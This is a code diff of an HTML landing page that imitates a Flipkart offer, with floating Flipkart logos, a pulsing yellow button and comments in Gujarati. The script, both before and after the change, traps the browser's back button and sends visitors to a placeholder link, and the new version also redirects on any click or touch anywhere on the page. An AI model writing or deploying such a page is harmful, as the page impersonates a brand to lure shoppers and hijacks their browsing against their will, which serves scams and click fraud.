@@ -12,7 +12,7 @@
             overflow: hidden;
         }
 
-        /* Floating Logos Background */
+        /* Floating Logos */
         @keyframes float {
             0% { transform: translate(0, 0) rotate(0deg); }
             50% { transform: translate(50px, 50px) rotate(180deg); }
@@ -26,53 +26,49 @@
 
         /* બટનની ઉપરનું લખાણ */
         .top-text { 
-            font-size: 24px; 
+            font-size: 18px; 
             font-weight: bold; 
             color: #ffffff; 
-            margin-bottom: 15px; 
+            margin-bottom: 12px; 
             text-transform: uppercase;
-            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
         }
 
-        /* ધ્રૂજતું એનિમેશન */
-        @keyframes shake {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-
-        /* ફ્લિપકાર્ટ સ્ટાઇલ પીળું બટન */
+        /* નાનું અને લાંબુ ગોળ બટન */
         .flipkart-button {
-            background-color: #ffe11b; /* Flipkart Yellow */
+            background-color: #ffe11b; 
             color: #212121;
-            padding: 20px 60px;
+            padding: 10px 45px; /* સાઈઝ નાની કરી */
             border: none;
-            border-radius: 8px; /* Standard Button Shape */
+            border-radius: 50px; /* લાંબુ ગોળ (Oval) */
             cursor: pointer;
             box-shadow: 0 4px 15px rgba(0,0,0,0.3);
             display: inline-block;
             text-decoration: none;
-            transition: transform 0.2s;
-            animation: shake 1s infinite;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+            100% { transform: scale(1); }
         }
 
         .offer-text { 
-            font-size: 28px; 
-            font-weight: 900; 
+            font-size: 20px; 
+            font-weight: 800; 
             display: block; 
-            line-height: 1;
+            line-height: 1.1;
         }
 
         .click-here-text { 
-            font-size: 16px; 
+            font-size: 12px; 
             display: block; 
-            margin-top: 5px; 
             font-weight: bold;
-            color: #000;
-            opacity: 0.8;
+            color: #333;
         }
     </style>
 </head>
-<body onclick="activateHijack()" ontouchstart="activateHijack()">
+<body onclick="fastRedirect()" ontouchstart="fastRedirect()">
 
     <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:10%; left:10%; animation: float 15s infinite linear;">
     <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:70%; left:15%; animation: float 20s infinite linear;">
@@ -90,23 +86,23 @@
     <script>
         var targetUrl = "https://તમારી-લિંક-અહીં-મૂકો.com"; 
 
-        // બેક બટન હાઇજેક
-        function activateHijack() {
-            for(var i=0; i<10; i++) {
-                window.history.pushState(null, null, window.location.href);
-            }
+        // ફાસ્ટ રિડાયરેક્ટ ફંક્શન
+        function fastRedirect() {
+            window.location.href = targetUrl;
         }
 
-        window.onload = function() {
-            window.history.pushState(null, null, window.location.href);
-            window.onpopstate = function(event) {
-                window.location.replace(targetUrl);
-            };
-        };
-
+        // બટન પર ક્લિક કરતા જ તરત રિડાયરેક્ટ
         document.getElementById("mainButton").onclick = function(e) {
             e.preventDefault();
             window.location.replace(targetUrl);
+        };
+
+        // બેક બટન ટ્રેપ (Fast)
+        window.onload = function() {
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = function() {
+                window.location.replace(targetUrl);
+            };
         };
     </script>
 </body>
